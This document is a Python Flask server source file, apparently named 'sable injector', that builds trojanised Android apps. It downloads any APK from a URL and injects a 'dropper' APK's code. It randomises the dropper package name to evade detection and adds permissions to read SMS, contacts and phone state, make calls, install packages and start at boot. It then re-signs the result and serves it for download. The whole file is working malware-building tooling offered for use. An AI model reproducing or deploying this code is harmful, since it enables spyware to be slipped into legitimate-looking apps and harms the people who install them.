import os
import subprocess
import shutil
import tempfile
import requests
import zipfile
import traceback
import random
import string
import re
import time
from flask import Flask, request, send_file, jsonify

app = Flask(__name__)
WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"
DROPPER = "dropper_base.apk"

@app.errorhandler(500)
def internal_error(exception):
    return jsonify({"error": f"Internal Server Error: {str(exception)}"}), 500

@app.route("/")
def home():
    return "sable injector alive"

@app.route("/inject", methods=["POST"])
def inject():
    try:
        data = request.json or {}
        file_url = data.get("apk_url")
        if not file_url:
            return jsonify({"error": "apk_url required"}), 400

        target = os.path.join(WORK, "target.apk")
        
        # 1. Download APK
        response = requests.get(file_url, stream=True, timeout=60)
        if response.status_code != 200:
            return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
        
        with open(target, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        if not zipfile.is_zipfile(target):
            return jsonify({"error": "Downloaded file is not a valid APK"}), 400

        # 2. Target APK decompile
        target_dir = os.path.join(WORK, "target_dir")
        shutil.rmtree(target_dir, ignore_errors=True)
        res = subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool target fail: {res.stderr[:200]}"}), 500

        # Purane signature hatao taaki naya sign karte waqt conflict na ho
        meta_inf = os.path.join(target_dir, "original", "META-INF")
        if os.path.exists(meta_inf):
            shutil.rmtree(meta_inf)

        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
        if os.path.isdir(manifest_path):
            return jsonify({"error": "Target APK structure is corrupt."}), 500

        # 3. Dropper APK decompile
        dropper_dir = os.path.join(WORK, "dropper_dir")
        shutil.rmtree(dropper_dir, ignore_errors=True)
        res = subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool dropper fail: {res.stderr[:200]}"}), 500

        # 4. Smali Copy & Anti-Detection (Randomize package)
        src_smali = os.path.join(dropper_dir, "smali")
        dst_smali = os.path.join(target_dir, "smali")
        if os.path.exists(src_smali):
            shutil.copytree(src_smali, dst_smali, dirs_exist_ok=True)
        
        random_pkg = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        old_pkg_path = os.path.join(dst_smali, "com", "sable", "dropper")
        new_pkg_path = os.path.join(dst_smali, "com", random_pkg, "dropper")
        if os.path.exists(old_pkg_path):
            shutil.copytree(old_pkg_path, new_pkg_path, dirs_exist_ok=True)
            shutil.rmtree(old_pkg_path)

        # 5. Remove Debugging Info (.line tags)
        for root, dirs, files in os.walk(dst_smali):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                    with open(file_path, "w", encoding="utf-8") as f:
                        for line in lines:
                            if not line.strip().startswith(".line"):
                                f.write(line)

        # 6. Merge Manifest & Add Permissions
        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            t = f.read()

        perms = [
            "android.permission.INTERNET",
            "android.permission.REQUEST_INSTALL_PACKAGES",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.WAKE_LOCK",
            "android.permission.READ_PHONE_STATE", 
            "android.permission.CALL_PHONE",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS"
        ]
        insert_perms = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
        if insert_perms:
            t = t.replace("</application>", insert_perms + "</application>")

        dropper_manifest_path = os.path.join(dropper_dir, "AndroidManifest.xml")
        with open(dropper_manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            d_manifest = f.read()
        
        components = re.findall(r'<(activity|service|receiver)[^>]*android:name="([^"]+)"[^>]*>', d_manifest)
        comp_str = ""
        for tag, name in components:
            new_name = name.replace("com.sable.dropper", f"com.{random_pkg}.dropper")
            comp_str += f'<{tag} android:name="{new_name}" android:exported="true" />\n'
            
        t = t.replace("</application>", comp_str + "</application>")
        with open(manifest_path, "w", encoding='utf-8') as f:
            f.write(t)

        # 7. Build APK
        unsigned = os.path.join(WORK, "unsigned.apk")
        res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool build fail: {res.stderr[:200]}"}), 500

        # 8. Align and Sign (V1 + V2 Signatures)
        aligned = os.path.join(WORK, "aligned.apk")
        signed = os.path.join(WORK, "signed.apk")
        subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
        
        res = subprocess.run(f"apksigner sign --min-sdk-version 21 --v1-signing-enabled true --v2-signing-enabled true --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Signing failed: {res.stderr[:200]}"}), 500

        return send_file(signed, as_attachment=True, download_name="injected.apk")

    except Exception as e:
        traceback.print_exc()
        return jsonify({"error": f"Python Error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
